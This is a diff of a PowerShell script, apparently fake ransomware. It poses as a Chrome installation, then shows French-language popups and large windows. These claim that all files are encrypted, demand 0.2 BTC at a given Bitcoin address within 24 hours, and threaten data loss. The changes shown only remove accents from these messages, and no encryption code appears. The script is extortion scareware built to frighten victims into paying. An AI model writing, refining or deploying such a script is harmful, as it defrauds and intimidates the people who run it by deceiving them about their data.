@@ -4,15 +4,15 @@ Add-Type -AssemblyName PresentationFramework
 [System.Windows.MessageBox]::Show('Installation en cours de Chrome...', 'Information', 'OK', 'Information')
 
 # Deuxième pop-up
-[System.Windows.MessageBox]::Show('Envoie-moi 0.2 BTC pour obtenir la clé de déchiffrement.', 'Avertissement', 'OK', 'Warning')
+[System.Windows.MessageBox]::Show('Envoie-moi 0.2 BTC pour obtenir la cle de dechiffrement.', 'Avertissement', 'OK', 'Warning')
 
 # Troisième pop-up
 [System.Windows.MessageBox]::Show('Mon adresse BTC: 1JHCFfjvY7g5Q8QvJ3Qs8Z2jWb3vzr7f7A\nVous avez 24 heures pour envoyer le paiement.', 'Urgence', 'OK', 'Error')
 
 # Grande fenêtre WPF pour ajouter de la peur
 $window = New-Object Windows.Window
-$window.Title = 'ALERTE SÉCURITÉ'
-$window.Content = 'TOUS VOS FICHIERS SONT CHIFFRÉS !'
+$window.Title = 'ALERTE SECURITE'
+$window.Content = 'TOUS VOS FICHIERS SONT CHIFFRES !'
 $window.FontSize = 48
 $window.Width = 800
 $window.Height = 400
@@ -24,8 +24,8 @@ $window.ShowDialog()
 
 # Deuxième grande fenêtre WPF
 $window2 = New-Object Windows.Window
-$window2.Title = 'DÉLAI RESTANT : 24 HEURES'
-$window2.Content = 'PAYEZ MAINTENANT OU PERDEZ VOS DONNÉES !'
+$window2.Title = 'DELAI RESTANT : 24 HEURES'
+$window2.Content = 'PAYEZ MAINTENANT OU PERDEZ VOS DONNEES !'
 $window2.FontSize = 42
 $window2.Width = 900
 $window2.Height = 500
